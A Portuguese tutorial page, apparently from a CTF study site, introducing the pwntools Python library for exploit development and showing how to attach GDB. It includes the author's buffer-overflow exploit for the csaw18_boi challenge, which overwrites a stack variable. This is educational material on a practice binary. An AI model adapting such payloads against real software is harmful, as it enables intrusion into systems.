---
title: "Scripts com Pwntools"
sidebar_position: 7
---

Pwntools é uma biblioteca do python para CTFs feita para desenvolvimento de exploits rapidamente. Ela realmente agiliza bastante o trabalho, e permite enviar inputs para programas ou servidores apenas rodando o arquivo python.

Para instalar, use o comando: `python3 -m pip install --upgrade pwntools`

(Em distribuições mais novas, o `pip` pode bloquear a instalação global com o erro *externally-managed-environment*. Nesse caso, crie um ambiente virtual com `python3 -m venv venv && source venv/bin/activate` antes de instalar.)

## O básico do pwntools

O pwntools se baseia na ideia de que podemos enviar inputs a um programa ou servidor, contendo dados que nos levam a manipular o programa como quisermos.

O fluxo de uso do Pwntools é:

1. Estabelecer target (`remote` para servidores e `process` para executáveis locais)
2. (Opcional) Anexar o GDB com `gdb.attach()` e enviar comandos iniciais a ele (já estabelecemos os breakpoints e quaisquer outros comandos em `gdbscript`)
3. Gerar dados, empacotar com `p64()` ou `p32()` e enviar com `target.send()` ou `target.sendline()`
4. Acesso manual com `target.interactive()`

```py
from pwn import *
# Conecta a um servidor:porta ao invés de fazê-lo no terminal
target = remote("github.com", 9000);
# Roda um binário (programa!)
target = process("./challenge")
# Adicionar o gdb debugger ao processo, dando um comando (b main e b my_function)
gdb.attach(target, gdbscript='''
b main
b my_function
''')
# Enviar variável x ao target como input
target.send(x)
# Enviar variável seguida de um \n
target.sendline(x)
# Printar linha única de texto do target
print(target.recvline())
# Printar tudo do target até a string desejada
print(target.recvuntil(b"out"))
'''
- Arquiteturas como x86 e x64 armazenam dados em little endian
- Isso significa que os dados são armazenados com o byte menos significativo primeiro (ao contrário)
- (inteiro -> 0x109F D7B4 9C2D 0135 // Armazenado na memória -> 35 01 2D 9C B4 D7 9F 10)
- Em algumas situações em que escaneamos um inteiro, precisamos levar isso em conta.
- Precisamos empacotar o inteiro (human readable -> binário)
'''
# Para empacotar número inteiro como little endian (sequência de bytes)
p64(x) # QWORD (x64 = 64 bits  = 8 bytes)
p32(x) # DWORD (x86 = 32 bits = 4 bytes)
# Para desempacotar little endian (sequência de bytes) como inteiro
u64(x) # QWORD
u32(x) # DWORD

# Interage manualmente com o target no terminal
target.interactive()
```

Exemplo de endianness com pwntools:
```py
# Big endian
p64(0x41424344, endian='big')  # b'\x00\x00\x00\x00ABCD'
u64(b'\x00\x00\x00\x00ABCD', endian='big')  # 0x41424344

# Little endian (padrão)
p64(0x41424344)  # b'DCBA\x00\x00\x00\x00'

```

Temos que trabalhar com `b''`, um objeto `bytes` do Python, e não strings padrão `''`. Isso cria uma sequência de bytes no Python, essencial para trabalhar com binários, pois binários trabalham com bytes e não strings. Comandos como `p64` retornam `bytes`.

```py
from pwn import *

conn = process('./challenge')

# Payload em bytes
payload = b'A' * 64 + p64(0x401234)
conn.send(payload)
```

## Pwntools com GDB

O pwntools pode ser usado com o gdb, o que facilita demais o processo de investigar e testar binários. 

Uma nota é que o gdb não vai mostrar as abas que ele normalmente mostra quando abrimos um programa com ele. Ele só recebe comandos mesmo.

O mais legal dessa ferramenta é que podemos dar comandos prévios ao gdb: breakpoints, ver rip, continue, ver rbp, etc. Se já sabemos o que queremos atacar e analisamos os endereços, basta colocar todos os comandos aqui e eles vão rodar automaticamente quando o script do pwntools for executado. Isso evita ter que digitar os mesmos comandos toda hora. Assim, além do pwntools já dar o nosso input, automatizamos todo o processo de debug. Isso é crazy.

### gdb.attach

Anexa o GDB a um processo já em execução.

Percebi que o `gdb.attach` possui alguns problemas. No teste abaixo, o breakpoint `b *0x004006a0` simplesmente não funcionou. Percebi que os breakpoints só rodam adequadamente APÓS a primeira leitura de input. Imagino que seja porque o GDB está sendo anexado ao processo. Isso significa que o processo já iniciou, e o gdb está chegando no meio da festa. Assim, imagino que o gdb só chega quando o programa já esteja esperando o primeiro input. (E é isso mesmo: o `gdb.attach` anexa o GDB a um processo que já está rodando, então tudo o que o programa executou antes disso já passou.) Com `gdb.debug`, como faremos a frente, tudo correu certo.

O código abaixo foi feito por mim para resolver [csaw18_boi](../pwning/stack/buffer-overflow/variables.md#chall-csaw18_boi). Não se preocupe se você não entender o ataque, apenas veja que podemos abrir o gdb E enviar inputs pelo pwntools para o mesmo programa.

```py
# exploit.py
from pwn import *

# Anexa processo (normal)
p = process('./boi')

'''
GDB Attach: O processo ./boi já está rodando, só "atracamos" o GDB ao processo.

Percebi que só rodam direito os breakpoints APÓS a primeira leitura de input, não consegui entender o motivo. 
'''
gdb.attach(p, '''
b *0x004006a0
b *0x004006ad
x/x $rip
c
x/x $rip
x/x $rbp-0x1c
c
x/x $rip
x/x $rbp-0x1c
''')

'''
Buffer Overflow - Variable
rbp-0x1c (para sobrescrever com 0xcaf3baee)
rbp-0x30 (input)
'''

# pwntools envia todos os inputs de uma vez, e o binário vai processando os inputs (mesmo com os breakpoints que colocamos)
payload = (b'A' * 0x14) + p64(0xcaf3baee)
p.sendline(payload)

# Sem isso, o processo morre.
p.interactive()
```

### gdb.debug

Inicia um novo processo já dentro do GDB desde o início. Precisa que você instale o `gdbserver` com `sudo apt install gdbserver`. Foi o mais estável que utilizei, não apresenta problemas.

Do mesmo modo que no anterior, o código abaixo foi feito por mim para resolver [csaw18_boi](../pwning/stack/buffer-overflow/variables.md#chall-csaw18_boi). Mas aqui mudamos umas coisinhas, pois o breakpoint 1 funciona. Recomendo utilizar `gdb.debug`, foi o que achei mais estável, já que o processo é iniciado pelo próprio gdb.

```py
# exploit.py
from pwn import *

# Percebi que o primeiro breakpoint não roda direito. Na verdade, percebi que só rodam direito os breakpoints após o input. Posso colocar todos os comandos aqui, na verdade.
p = gdb.debug('./boi', '''
b *0x004006a0
b *0x004006ad
x/x $rip
c
x/x $rip
x/x $rbp-0x1c
c
x/x $rip
x/x $rbp-0x1c
''')

'''
rbp-0x1c (para sobrescrever com 0xcaf3baee)
rbp-0x30 (input)
'''

# pwntools envia todos os inputs de uma vez, e o arquivo vai processando.
payload = (b'A' * 0x14) + p64(0xcaf3baee)
p.sendline(payload)

# Sem isso, o processo morre.
p.interactive()
```

Eu disse que o gdb aberto pelo pwntools é mais minimalista (apenas comandos). Abaixo vemos um exemplo da nova janela aberta pelo gdb, e como ele fica.

```bash
# Introdução do gdb
Reading symbols from ./boi...
(No debugging symbols found in ./boi)
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
0x00007f73f082a440 in ?? () from target:/lib64/ld-linux-x86-64.so.2

# Aqui nossos comandos são executados
Breakpoint 1 at 0x4006a0    # b *0x004006a0
Breakpoint 2 at 0x4006ad    # b *0x004006ad
0x7f73f082a440: 0xe8e78948  # x/x $rip (note que o endereço em que estamos é bem diferente dos endereços do código. Isso ocorre pois ainda estamos no loader dinâmico, o ld-linux, que carrega as bibliotecas dinâmicas, como a libc, antes do programa começar)
Reading /lib/x86_64-linux-gnu/libc.so.6 from remote target...

# continue (linhas inteiras sem nada são um continue)

Breakpoint 1, 0x00000000004006a0 in main ()     # breakpoint 1
0x4006a0 <main+95>:     0xfffe5be8      # x/x $rip
0x7ffc6a124874: 0xdeadbeef      # x/x $rbp-0x1c

# continue

Breakpoint 2, 0x00000000004006ad in main ()     # breakpoint 2
0x4006ad <main+108>:    0x7cbf0c75      # x/x $rip
0x7ffc6a124874: 0xcaf3baee      # x/x $rbp-0x1c
(gdb)       # Aqui podemos rodar o comando que quisermos
```